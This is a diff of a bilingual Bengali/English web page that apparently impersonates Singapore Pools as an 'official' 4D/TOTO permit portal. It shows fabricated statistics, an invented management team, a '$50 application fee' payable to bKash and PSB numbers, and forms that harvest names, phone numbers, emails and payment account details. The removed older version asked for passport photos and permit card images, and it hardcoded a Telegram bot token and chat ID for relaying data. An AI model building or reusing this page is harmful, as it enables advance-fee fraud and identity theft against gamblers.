@@ -1,566 +1,344 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Singapore 4D/6D Portal</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-
-    /* 4D/Lottery Theme Animated Background */
-    body {
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    /* Background Watermarks */
-    body::before {
-      content: "4D 6D 4829 9501 3820";
-      position: absolute;
-      top: 10%;
-      left: 5%;
-      font-size: 80px;
-      font-weight: 900;
-      color: rgba(255, 255, 255, 0.03);
-      white-space: nowrap;
-      user-select: none;
-      pointer-events: none;
-      transform: rotate(-15deg);
-    }
-
-    body::after {
-      content: "SINGAPORE LOTTERY 4D";
-      position: absolute;
-      bottom: 10%;
-      right: 5%;
-      font-size: 70px;
-      font-weight: 900;
-      color: rgba(255, 255, 255, 0.03);
-      white-space: nowrap;
-      user-select: none;
-      pointer-events: none;
-      transform: rotate(-10deg);
-    }
-
-    .container {
-      background: rgba(255, 255, 255, 0.96);
-      backdrop-filter: blur(10px);
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-      width: 100%;
-      max-width: 500px;
-      position: relative;
-      z-index: 10;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-
-    .lang-btn {
-      position: absolute;
-      top: 15px;
-      right: 20px;
-      background: #11998e;
-      border: none;
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      color: #ffffff;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-      transition: all 0.3s ease;
-    }
-
-    .lang-btn:hover {
-      background: #38ef7d;
-      color: #000;
-    }
-
-    h2 {
-      color: #1a252f;
-      margin-bottom: 15px;
-      text-align: center;
-      font-size: 22px;
-    }
-
-    .tabs {
-      display: flex;
-      margin-bottom: 20px;
-      border-bottom: 2px solid #e4e6eb;
-    }
-
-    .tab-btn {
-      flex: 1;
-      padding: 10px;
-      background: none;
-      border: none;
-      font-size: 16px;
-      font-weight: bold;
-      color: #65676b;
-      cursor: pointer;
-    }
-
-    .tab-btn.active {
-      color: #e74c3c;
-      border-bottom: 3px solid #e74c3c;
-    }
-
-    .input-group {
-      margin-bottom: 15px;
-    }
-
-    .input-group label {
-      display: block;
-      font-size: 14px;
-      font-weight: 600;
-      color: #2c3e50;
-      margin-bottom: 6px;
-    }
-
-    .input-group input,
-    .input-group select {
-      width: 100%;
-      padding: 11px;
-      border: 1px solid #dcdde1;
-      border-radius: 8px;
-      font-size: 14px;
-      outline: none;
-      transition: border-color 0.3s ease;
-      background: #fdfdfd;
-    }
-
-    .input-group input:focus,
-    .input-group select:focus {
-      border-color: #e74c3c;
-      box-shadow: 0 0 5px rgba(231, 76, 60, 0.2);
-    }
-
-    /* Password Input Wrapper with Show/Hide Button */
-    .password-wrapper {
-      position: relative;
-      display: flex;
-      align-items: center;
-    }
-
-    .password-wrapper input {
-      padding-right: 45px;
-    }
-
-    .toggle-pass {
-      position: absolute;
-      right: 10px;
-      background: none;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
-      color: #7f8c8d;
-      user-select: none;
-    }
-
-    .name-fields {
-      display: flex;
-      gap: 10px;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 12px;
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      color: #ffffff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-      box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
-      transition: transform 0.2s ease, background 0.3s ease;
-    }
-
-    .btn:hover {
-      transform: translateY(-2px);
-      background: linear-gradient(135deg, #d63031, #9b2313);
-    }
-
-    .btn:disabled {
-      background: #bdc3c7;
-      cursor: not-allowed;
-    }
-
-    .error-msg {
-      color: #d63031;
-      background: #ffeae8;
-      padding: 8px 12px;
-      border-radius: 6px;
-      font-size: 13px;
-      margin-bottom: 15px;
-      display: none;
-      text-align: center;
-      border: 1px solid #ff7675;
-    }
-
-    .hidden {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Singapore Pools - Official 4D & TOTO Portal</title>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <!-- Custom CSS Link -->
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div class="container">
-    <!-- ভাষা পরিবর্তনের বাটন -->
-    <button class="lang-btn" onclick="toggleLanguage()" id="langBtn">English</button>
-
-    <!-- ট্যাব (সাইন আপ / লগইন) -->
-    <div class="tabs" id="authTabs">
-      <button class="tab-btn active" onclick="switchAuthTab('signup')" id="tabSignup">সাইন আপ</button>
-      <button class="tab-btn" onclick="switchAuthTab('login')" id="tabLogin">লগইন</button>
+    <!-- Top Helpline Banner -->
+    <div class="top-helpline" data-en="If you notice that you or somebody you know may be gambling excessively, call the National Problem Gambling Helpline today at 1800-6-668-668." data-bn="আপনি বা আপনার পরিচিত কেউ অতিরিক্ত জুয়া খেলায় আসক্ত হয়ে পড়লে, আজই ন্যাশনাল প্রবলেম জুয়া হেল্পলাইনে কল করুন: 1800-6-668-668।">
+        আপনি বা আপনার পরিচিত কেউ অতিরিক্ত জুয়া খেলায় আসক্ত হয়ে পড়লে, আজই ন্যাশনাল প্রবলেম জুয়া হেল্পলাইনে কল করুন: 1800-6-668-668।
     </div>
 
-    <div id="errorBox" class="error-msg"></div>
-
-    <!-- সাইন আপ ফর্ম -->
-    <form id="signupForm" onsubmit="handleSignup(event)">
-      <div class="input-group">
-        <label id="lblEmail">ইমেইল অথবা ফোন নম্বর</label>
-        <input type="text" id="signupEmail" required placeholder="ইমেইল বা ফোন দিন">
-      </div>
-      <div class="input-group">
-        <label id="lblPass">পাসওয়ার্ড (নূন্যতম ৬ অক্ষর)</label>
-        <div class="password-wrapper">
-          <input type="password" id="signupPass" required minlength="6" placeholder="পাসওয়ার্ড দিন">
-          <button type="button" class="toggle-pass" onclick="togglePasswordVisibility('signupPass', this)">👁️</button>
+    <!-- Header Section -->
+    <header class="header">
+        <div class="logo-container">
+            <!-- Official Logo SVG Component -->
+            <div class="official-logo-box">
+                <svg viewBox="0 0 100 100" class="sg-logo-svg">
+                    <rect width="100" height="100" rx="15" fill="#005bac"/>
+                    <path d="M20 25 H80 V42 H42 V58 H75 V75 H20 Z" fill="#ffffff"/>
+                </svg>
+                <div class="logo-text-group">
+                    <span class="sp-top-text">SINGAPORE</span>
+                    <span class="sp-bottom-text">POOLS</span>
+                </div>
+            </div>
+            <div>
+                <h1 data-en="Singapore Pools" data-bn="সিঙ্গাপুর পুলস">সিঙ্গাপুর পুলস</h1>
+                <span class="header-sub" data-en="Official Authorized Portal" data-bn="অফিশিয়াল অনুমোদিত পোর্টাল">অফিশিয়াল অনুমোদিত পোর্টাল</span>
+            </div>
         </div>
-      </div>
-      <button type="submit" class="btn" id="btnSignup">সাইন আপ করুন</button>
-    </form>
-
-    <!-- লগইন ফর্ম -->
-    <form id="loginForm" class="hidden" onsubmit="handleLogin(event)">
-      <div class="input-group">
-        <label id="lblLoginEmail">ইমেইল অথবা ফোন নম্বর</label>
-        <input type="text" id="loginEmail" required placeholder="ইমেইল বা ফোন দিন">
-      </div>
-      <div class="input-group">
-        <label id="lblLoginPass">পাসওয়ার্ড</label>
-        <div class="password-wrapper">
-          <input type="password" id="loginPass" required placeholder="পাসওয়ার্ড দিন">
-          <button type="button" class="toggle-pass" onclick="togglePasswordVisibility('loginPass', this)">👁️</button>
+        <div class="header-actions">
+            <a href="https://t.me" target="_blank" class="admin-btn tg-header-btn" title="Telegram"><i class="fab fa-telegram-plane"></i></a>
+            <button type="button" onclick="promptAdminPassword()" class="admin-btn"><i class="fas fa-lock"></i> <span data-en="Admin" data-bn="অ্যাডমিন">অ্যাডমিন</span></button>
+            
+            <select class="lang-select" id="langSelector" onchange="changeLanguage(this.value)">
+                <option value="bn" selected>বাংলা</option>
+                <option value="en">English</option>
+            </select>
         </div>
-      </div>
-      <button type="submit" class="btn" id="btnLogin">লগইন করুন</button>
-    </form>
+    </header>
 
-    <!-- মূল 4D/6D ফর্ম -->
-    <div id="mainPortal" class="hidden">
-      <h2 id="portalTitle">সিঙ্গাপুর 4D/6D ফর্ম</h2>
+    <!-- Navigation Bar -->
+    <nav class="nav-bar">
+        <button type="button" id="nav-home" onclick="showSection('home')" class="active"><i class="fas fa-home"></i> <span data-en="Home" data-bn="হোম">হোম</span></button>
+        <button type="button" id="nav-guide" onclick="showSection('guide')"><i class="fas fa-book"></i> <span data-en="Guide" data-bn="নির্দেশিকা">নির্দেশিকা</span></button>
+        <button type="button" id="nav-apply" onclick="showSection('apply')"><i class="fas fa-file-alt"></i> <span data-en="Apply Now" data-bn="আবেদন করুন">আবেদন করুন</span></button>
+        <button type="button" id="nav-status" onclick="showSection('status')"><i class="fas fa-search"></i> <span data-en="Check Status" data-bn="স্ট্যাটাস চেক">স্ট্যাটাস চেক</span></button>
+    </nav>
 
-      <form id="lotteryForm" onsubmit="handleFormSubmit(event)">
-        <!-- ফার্স্ট এবং লাস্ট নাম -->
-        <div class="input-group name-fields">
-          <div style="flex: 1;">
-            <label id="lblFirstName">ফার্স্ট নাম</label>
-            <input type="text" id="firstName" required placeholder="First Name">
-          </div>
-          <div style="flex: 1;">
-            <label id="lblLastName">লাস্ট নাম</label>
-            <input type="text" id="lastName" required placeholder="Last Name">
-          </div>
+    <!-- Main Container -->
+    <main class="container">
+
+        <!-- HOME SECTION -->
+        <section id="section-home" class="page-section">
+            <div class="banner">
+                <h2 data-en="Official 4D & TOTO Permit Portal" data-bn="অফিশিয়াল ৪ডি ও টোটো পারমিট পোর্টাল">অফিশিয়াল ৪ডি ও টোটো পারমিট পোর্টাল</h2>
+                <p data-en="Apply securely for your official Singapore Pools permit and check results instantly." data-bn="নিরাপদে আপনার অফিশিয়াল সিঙ্গাপুর পুলস পারমিটের জন্য আবেদন করুন এবং ফলাফল যাচাই করুন।">নিরাপদে আপনার অফিশিয়াল সিঙ্গাপুর পুলস পারমিটের জন্য আবেদন করুন এবং ফলাফল যাচাই করুন।</p>
+                <button type="button" onclick="showSection('apply')" class="cta-btn" data-en="Apply For Permit Now" data-bn="এখনই পারমিটের জন্য আবেদন করুন">এখনই পারমিটের জন্য আবেদন করুন</button>
+            </div>
+
+            <!-- Live Stats & Review Counter -->
+            <div class="card stats-card">
+                <h3 data-en="Live Portal Statistics & Reviews" data-bn="লাইভ পোর্টাল স্ট্যাটিস্টিক্স ও রিভিউ"><i class="fas fa-chart-line"></i> লাইভ পোর্টাল স্ট্যাটিস্টিক্স ও রিভিউ</h3>
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <i class="fas fa-users" style="color: #2563eb;"></i>
+                        <h4 id="totalAppStat">1,420+</h4>
+                        <p data-en="Total Applicants" data-bn="মোট আবেদনকারী">মোট আবেদনকারী</p>
+                    </div>
+                    <div class="stat-box">
+                        <i class="fas fa-smile-beam" style="color: #16a34a;"></i>
+                        <h4 id="satisfiedStat">99.4%</h4>
+                        <p data-en="Satisfied Clients" data-bn="সন্তুষ্ট ক্লায়েন্ট">সন্তুষ্ট ক্লায়েন্ট</p>
+                    </div>
+                    <div class="stat-box">
+                        <i class="fas fa-trophy" style="color: #ca8a04;"></i>
+                        <h4 id="winnersStat">850+</h4>
+                        <p data-en="Winners Funded" data-bn="বিজয়ী লটারি প্রদান">বিজয়ী লটারি প্রদান</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Singapore Pools Official Statistics Cards -->
+            <div class="card">
+                <h3 style="margin-bottom: 15px; font-size: 16px; color: #0f172a;" data-en="Singapore Pools Key Statistics" data-bn="সিঙ্গাপুর পুলসের মূল পরিসংখ্যান"><i class="fas fa-chart-bar"></i> সিঙ্গাপুর পুলসের মূল পরিসংখ্যান</h3>
+                
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-chart-line"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Turnover" data-bn="টার্নওভার">টার্নওভার</span>
+                        <h4 class="info-value">$13.5 Billion</h4>
+                    </div>
+                </div>
+
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-users"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Staff Strength" data-bn="কর্মী সংখ্যা">কর্মী সংখ্যা</span>
+                        <h4 class="info-value" data-en="Close to 1,000" data-bn="প্রায় ১,০০০">প্রায় ১,০০০</h4>
+                    </div>
+                </div>
+
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-hand-holding-usd"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Contributions to Tote Board" data-bn="টোট বোর্ডে অবদান">টোট বোর্ডে অবদান</span>
+                        <h4 class="info-value">$583 Million</h4>
+                    </div>
+                </div>
+
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-clock"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Staff Volunteered Hours" data-bn="কর্মীদের স্বেচ্ছাসেবী ঘণ্টা">কর্মীদের স্বেচ্ছাসেবী ঘণ্টা</span>
+                        <h4 class="info-value">> 8,433</h4>
+                    </div>
+                </div>
+
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-file-invoice-dollar"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Betting Duties & Taxes" data-bn="বেটিং ডিউটি ও ট্যাক্স">বেটিং ডিউটি ও ট্যাক্স</span>
+                        <h4 class="info-value">$2.49 Billion</h4>
+                    </div>
+                </div>
+
+                <div class="info-card-box">
+                    <div class="info-icon"><i class="fas fa-hands-helping"></i></div>
+                    <div class="info-content">
+                        <span class="info-title" data-en="Staff Volunteerism Rate" data-bn="কর্মী স্বেচ্ছাসেবী হার">কর্মী স্বেচ্ছাসেবী হার</span>
+                        <h4 class="info-value">60%</h4>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Singapore Office Team / Management Section -->
+            <div class="card">
+                <h3 style="margin-bottom: 15px; font-size: 16px; color: #0f172a;" data-en="Singapore Head Office Management Team" data-bn="সিঙ্গাপুর হেড অফিস ম্যানেজমেন্ট টিম"><i class="fas fa-user-tie"></i> সিঙ্গাপুর হেড অফিস ম্যানেজমেন্ট টিম</h3>
+                <div class="team-grid">
+                    <div class="team-member">
+                        <div class="member-avatar"><i class="fas fa-user-shield"></i></div>
+                        <h4>David Tan</h4>
+                        <p class="role" data-en="Chief Operations Officer" data-bn="চিফ অপারেশনস অফিসার">চিফ অপারেশনস অফিসার</p>
+                        <p class="desc" data-en="Managing authorized 4D & TOTO permits and security verification." data-bn="অনুমোদিত ৪ডি ও টোটো পারমিট এবং নিরাপত্তা যাচাইকরণ পরিচালনা করছেন।">অনুমোদিত ৪ডি ও টোটো পারমিট এবং নিরাপত্তা যাচাইকরণ পরিচালনা করছেন।</p>
+                    </div>
+                    <div class="team-member">
+                        <div class="member-avatar"><i class="fas fa-user-tie"></i></div>
+                        <h4>Lim Wei Ling</h4>
+                        <p class="role" data-en="Head of Client Relations" data-bn="হেড অফ ক্লায়েন্ট রিলেশন্স">হেড অফ ক্লায়েন্ট রিলেশন্স</p>
+                        <p class="desc" data-en="Overseeing international client applications and payout verification." data-bn="আন্তর্জাতিক ক্লায়েন্ট আবেদন এবং পেমেন্ট যাচাইকরণ তত্ত্বাবধান করছেন।">আন্তর্জাতিক ক্লায়েন্ট আবেদন এবং পেমেন্ট যাচাইকরণ তত্ত্বাবধান করছেন।</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="social-section">
+                <p style="font-size: 13px; font-weight: 600;" data-en="Connect With Us & WhatsApp Support" data-bn="আমাদের সাথে যুক্ত হোন ও হোয়াটসঅ্যাপ সাপোর্ট">আমাদের সাথে যুক্ত হোন ও হোয়াটসঅ্যাপ সাপোর্ট</p>
+                <div class="social-icons">
+                    <a href="https://www.facebook.com/Singaporepoolsinthecommunity" target="_blank" class="social-icon fb"><i class="fab fa-facebook-f"></i></a>
+                    <a href="https://instagram.com/sgpools?mdxt=ZjAwcGZ5ejcxYXg%3D" target="_blank" class="social-icon ig"><i class="fab fa-instagram"></i></a>
+                    <a href="https://youtube.com/@singaporepools4915?si=x3ty7KAEHaNtoMaJ" target="_blank" class="social-icon yt"><i class="fab fa-youtube"></i></a>
+                    <a href="https://wa.me/66840502810" target="_blank" class="social-icon wa"><i class="fab fa-whatsapp"></i></a>
+                </div>
+            </div>
+        </section>
+
+        <!-- GUIDE SECTION -->
+        <section id="section-guide" class="page-section hidden">
+            <div class="card">
+                <h2 data-en="Application Instructions" data-bn="আবেদনের নির্দেশিকা"><i class="fas fa-info-circle"></i> আবেদনের নির্দেশিকা</h2>
+                <p style="font-size: 13px; line-height: 1.6;" data-en="1. Go to 'Apply Now' and fill out all mandatory information.<br>2. Send the official fee ($50) to our official bKash or PSB account.<br>3. Submit the form to get your Application ID and check your status once approved." data-bn="১. 'আবেদন করুন' এ গিয়ে সমস্ত বাধ্যতামূলক তথ্য পূরণ করুন。<br>২. অফিশিয়াল ফি ($50) আমাদের বিকাশ বা PSB অ্যাকাউন্টে প্রদান করুন。<br>৩. সাবমিট করে অ্যাপ্লিকেশন আইডি সংগ্রহ করুন যা দিয়ে স্ট্যাটাস চেক ও অনুমোদন সাপেক্ষে লটারি নম্বর পাবেন।">
+                    ১. 'আবেদন করুন' এ গিয়ে সমস্ত বাধ্যতামূলক তথ্য পূরণ করুন。<br>
+                    ২. অফিশিয়াল ফি ($50) আমাদের বিকাশ বা PSB অ্যাকাউন্টে প্রদান করুন。<br>
+                    ৩. সাবমিট করে অ্যাপ্লিকেশন আইডি সংগ্রহ করুন যা দিয়ে স্ট্যাটাস চেক ও অনুমোদন সাপেক্ষে লটারি নম্বর পাবেন।
+                </p>
+            </div>
+        </section>
+
+        <!-- APPLY SECTION -->
+        <section id="section-apply" class="page-section hidden">
+            <div class="card">
+                <h2 data-en="Permit Application Form" data-bn="পারমিট আবেদন ফরম"><i class="fas fa-file-signature"></i> পারমিট আবেদন ফরম</h2>
+                <div class="fee-badge" data-en="Official Application Fee: $50" data-bn="অফিশিয়াল আবেদন ফি: $50">অফিশিয়াল আবেদন ফি: $50</div>
+                
+                <form id="applicationForm" onsubmit="handleFormSubmit(event)">
+                    <div class="form-group">
+                        <label data-en="First Name *" data-bn="প্রথম নাম *">প্রথম নাম *</label>
+                        <input type="text" id="firstName" required placeholder="Enter first name">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Last Name *" data-bn="শেষ নাম *">শেষ নাম *</label>
+                        <input type="text" id="lastName" required placeholder="Enter last name">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Contact Number (WhatsApp/Phone) *" data-bn="যোগাযোগের নম্বর (হোয়াটসঅ্যাপ/ফোন) *">যোগাযোগের নম্বর (হোয়াটসঅ্যাপ/ফোন) *</label>
+                        <input type="text" id="contactNumber" required placeholder="017XXXXXXXX">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Gmail Address *" data-bn="জিমেইল ঠিকানা *">জিমেইল ঠিকানা *</label>
+                        <input type="email" id="gmail" required placeholder="example@gmail.com">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Select Permit Type *" data-bn="পারমিট টাইপ নির্বাচন করুন *">পারমিট টাইপ নির্বাচন করুন *</label>
+                        <select id="permitType" required>
+                            <option value="4D">4D Permit</option>
+                            <option value="TOTO">TOTO Permit</option>
+                        </select>
+                    </div>
+
+                    <div class="payment-box">
+                        <label style="font-weight: bold; margin-bottom: 5px; display: block;" data-en="Payment Details & Copy Numbers ($50 Fee):" data-bn="পেমেন্ট ডিটেইলস ও নম্বর কপি করুন ($50 ফি):">পেমেন্ট ডিটেইলস ও নম্বর কপি করুন ($50 ফি):</label>
+                        <div class="account-cards">
+                            <div class="acc-card">
+                                <span>bKash: <strong id="displayBikash">01879774023</strong></span>
+                                <button type="button" class="copy-btn" onclick="copyToClipboard('displayBikash', this)" data-en="Copy" data-bn="কপি">কপি</button>
+                            </div>
+                            <div class="acc-card">
+                                <span>PSB: <strong id="displayPsb">8461912</strong></span>
+                                <button type="button" class="copy-btn" onclick="copyToClipboard('displayPsb', this)" data-en="Copy" data-bn="কপি">কপি</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Sender Account Number (bKash/Bank) *" data-bn="প্রেরক অ্যাকাউন্ট নম্বর (বিকাশ/ব্যাংক) *">প্রেরক অ্যাকাউন্ট নম্বর (বিকাশ/ব্যাংক) *</label>
+                        <input type="text" id="senderAccount" required placeholder="Account number you sent money from">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Last 4 Digits of Transaction ID *" data-bn="ট্রানজেকশন আইডির শেষ ৪ ডিজিট *">ট্রানজেকশন আইডির শেষ ৪ ডিজিট *</label>
+                        <input type="text" id="lastDigits" required maxlength="4" placeholder="e.g. 4892">
+                    </div>
+
+                    <div class="form-group">
+                        <label data-en="Other Notes (Optional)" data-bn="অন্যান্য নোট (ঐচ্ছিক)">অন্যান্য নোট (ঐচ্ছিক)</label>
+                        <textarea id="receiveMoneyInfo" placeholder="Any extra information"></textarea>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-submit" data-en="Submit Application" data-bn="আবেদন জমা দিন">আবেদন জমা দিন</button>
+                </form>
+            </div>
+        </section>
+
+        <!-- STATUS SECTION -->
+        <section id="section-status" class="page-section hidden">
+            <div class="card">
+                <h2><i class="fas fa-search-dollar"></i> <span data-en="Check Application Status" data-bn="আবেদনের স্ট্যাটাস চেক করুন">আবেদনের স্ট্যাটাস চেক করুন</span></h2>
+                <div class="form-group">
+                    <label data-en="Application ID *" data-bn="অ্যাপ্লিকেশন আইডি *">অ্যাপ্লিকেশন আইডি *</label>
+                    <input type="text" id="checkAppNo" placeholder="e.g. APP-4892">
+                </div>
+                <div class="form-group">
+                    <label data-en="Contact Number *" data-bn="যোগাযোগের নম্বর *">যোগাযোগের নম্বর *</label>
+                    <input type="text" id="checkContact" placeholder="Your contact number">
+                </div>
+                <button type="button" onclick="checkStatus()" class="btn-submit" data-en="Check Status" data-bn="স্ট্যাটাস চেক করুন">স্ট্যাটাস চেক করুন</button>
+
+                <div id="statusResult" class="hidden" style="margin-top: 20px;"></div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal hidden">
+        <div class="modal-content">
+            <i class="fas fa-check-circle" style="font-size: 50px; color: #16a34a; margin-bottom: 10px;"></i>
+            <h3 data-en="Application Submitted Successfully!" data-bn="আবেদন সফলভাবে জমা হয়েছে!">আবেদন সফলভাবে জমা হয়েছে!</h3>
+            <p data-en="Your Application ID is:" data-bn="আপনার অ্যাপ্লিকেশন আইডি হলো:">আপনার অ্যাপ্লিকেশন আইডি হলো:</p>
+            <div id="generatedAppIdBox" class="app-id-box">APP-XXXX</div>
+            <p style="font-size: 13px; color: #64748b; margin-top: 10px;" data-en="Save this ID to check status and win number upon approval." data-bn="অনুমোদন সাপেক্ষে স্ট্যাটাস ও লটারি নম্বর দেখতে এই আইডি সংরক্ষণ করুন।">অনুমোদন সাপেক্ষে স্ট্যাটাস ও লটারি নম্বর দেখতে এই আইডি সংরক্ষণ করুন।</p>
+            <button type="button" onclick="closeSuccessModal()" class="btn-submit" style="margin-top: 15px;" data-en="Check Status Now" data-bn="এখনই স্ট্যাটাস চেক করুন">এখনই স্ট্যাটাস চেক করুন</button>
         </div>
-
-        <!-- কন্টাক্ট নম্বর -->
-        <div class="input-group">
-          <label id="lblContact">কন্টাক্ট নম্বর</label>
-          <input type="tel" id="contactNum" required placeholder="+65 XXXX XXXX">
-        </div>
-
-        <!-- টাইপ সিলেক্ট (4D/6D) -->
-        <div class="input-group">
-          <label id="lblType">টাইপ সিলেক্ট করুন</label>
-          <select id="digitType" required>
-            <option value="" disabled selected>টাইপ নির্বাচন করুন</option>
-            <option value="4D">4D Number</option>
-            <option value="6D">6D Number</option>
-          </select>
-        </div>
-
-        <!-- ছবি আপলোড -->
-        <div class="input-group">
-          <label id="lblProfilePic">নিজের পাসপোর্ট সাইজের ছবি</label>
-          <input type="file" id="profilePic" accept="image/*" required>
-        </div>
-
-        <div class="input-group">
-          <label id="lblFrontPic">পারমিট কার্ড (সামনের ছবি)</label>
-          <input type="file" id="frontPic" accept="image/*" required>
-        </div>
-
-        <div class="input-group">
-          <label id="lblBackPic">পারমিট কার্ড (পিছনের ছবি)</label>
-          <input type="file" id="backPic" accept="image/*" required>
-        </div>
-
-        <!-- POSB / DBS পেমেন্ট ডিটেইলস -->
-        <div class="input-group">
-          <label id="lblBankAcc">POSB / DBS একাউন্ট নম্বর (যে একাউন্ট থেকে পেমেন্ট করেছেন)</label>
-          <input type="text" id="bankAcc" required placeholder="যেমন: XXX-XXXXX-X">
-        </div>
-
-        <div class="input-group">
-          <label id="lblAccHolder">একাউন্ট হোল্ডারের নাম (Account Holder Name)</label>
-          <input type="text" id="accHolder" required placeholder="যেমন: MD TANVIR AHMED">
-        </div>
-
-        <button type="submit" class="btn" id="btnSubmitForm">কনফার্ম ও জমা দিন</button>
-      </form>
     </div>
 
-  </div>
+    <!-- Admin Modal -->
+    <div id="adminModal" class="modal hidden">
+        <div class="modal-content admin-modal-box">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h3 data-en="Admin Panel & Global Settings" data-bn="অ্যাডমিন প্যানেল ও গ্লোবাল সেটিংস">অ্যাডমিন প্যানেল ও গ্লোবাল সেটিংস</h3>
+                <button type="button" onclick="closeAdminModal()" style="background: none; border: none; font-size: 20px; cursor: pointer;"><i class="fas fa-times"></i></button>
+            </div>
+            
+            <div style="background: #f8fafc; padding: 10px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #cbd5e1;">
+                <h4 style="font-size: 13px; margin-bottom: 8px;" data-en="Update Global Payment Numbers (For All Users)" data-bn="গ্লোবাল পেমেন্ট নম্বর আপডেট করুন (সকলের জন্য)">গ্লোবাল পেমেন্ট নম্বর আপডেট করুন (সকলের জন্য)</h4>
+                <div class="form-group" style="margin-bottom: 6px;">
+                    <label style="font-size: 11px;">bKash Number:</label>
+                    <input type="text" id="adminBikashInput" style="padding: 6px;">
+                </div>
+                <div class="form-group" style="margin-bottom: 6px;">
+                    <label style="font-size: 11px;">PSB Account:</label>
+                    <input type="text" id="adminPsbInput" style="padding: 6px;">
+                </div>
+                <button type="button" onclick="saveAdminSettings()" class="btn-submit" style="padding: 6px; font-size: 12px;" data-en="Save & Update For Everyone" data-bn="সকলের জন্য সেভ ও আপডেট করুন">সকলের জন্য সেভ ও আপডেট করুন</button>
+            </div>
 
-  <script>
-    // টেলিগ্রাম বট কনফিগারেশন
-    const TELEGRAM_BOT_TOKEN = "8711729817:AAG2VUDDl3lmTCcPZGADEpMo3U_OeqcIJW8";
-    const TELEGRAM_CHAT_ID = "7560607133";
+            <div class="admin-top" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <h4 style="font-size: 13px;" data-en="Central Applications List" data-bn="সকল সেন্ট্রাল আবেদনের তালিকা">সকল সেন্ট্রাল আবেদনের তালিকা</h4>
+                <button type="button" onclick="loadAdminData()" style="background: #e2e8f0; border: none; padding: 4px 8px; border-radius: 4px; font-size: 11px; cursor: pointer;" data-en="Refresh" data-bn="রিফ্রেশ">রিফ্রেশ</button>
+            </div>
+            <div id="adminTableContainer" style="overflow-x: auto; max-height: 280px; overflow-y: auto; border: 1px solid #cbd5e1; border-radius: 6px; background: #fff;"></div>
+        </div>
+    </div>
 
-    let currentLang = 'bn';
+    <!-- Live Chat Widget -->
+    <div class="chat-widget">
+        <button type="button" onclick="toggleChatBox()" class="chat-toggle-btn"><i class="fas fa-comments"></i></button>
+        <div id="liveChatBox" class="chat-box hidden">
+            <div class="chat-header">
+                <span data-en="WhatsApp Support (+66840502810)" data-bn="হোয়াটসঅ্যাপ সাপোর্ট (+66840502810)">হোয়াটসঅ্যাপ সাপোর্ট (+66840502810)</span>
+                <button type="button" onclick="toggleChatBox()" style="background:none; border:none; color:white; cursor:pointer;"><i class="fas fa-times"></i></button>
+            </div>
+            <div id="chatBody" class="chat-body">
+                <div class="chat-msg bot"><span data-en="Hello! Welcome to Singapore Pools. Direct WhatsApp:" data-bn="হ্যালো! সিঙ্গাপুর পুলসে আপনাকে স্বাগতম। সরাসরি হোয়াটসঅ্যাপ:">হ্যালো! সিঙ্গাপুর পুলসে আপনাকে স্বাগতম। সরাসরি হোয়াটসঅ্যাপ:</span> <a href="https://wa.me/66840502810" target="_blank" style="color:#25d366; font-weight:bold;">+66840502810</a></div>
+            </div>
+            <div class="chat-footer">
+                <input type="text" id="chatInput" placeholder="Type a message..." onkeypress="handleChatKey(event)">
+                <button type="button" onclick="sendChatMessage()"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </div>
+    </div>
 
-    // পাসওয়ার্ড শো / হাইড টগল ফাংশন
-    function togglePasswordVisibility(inputId, btn) {
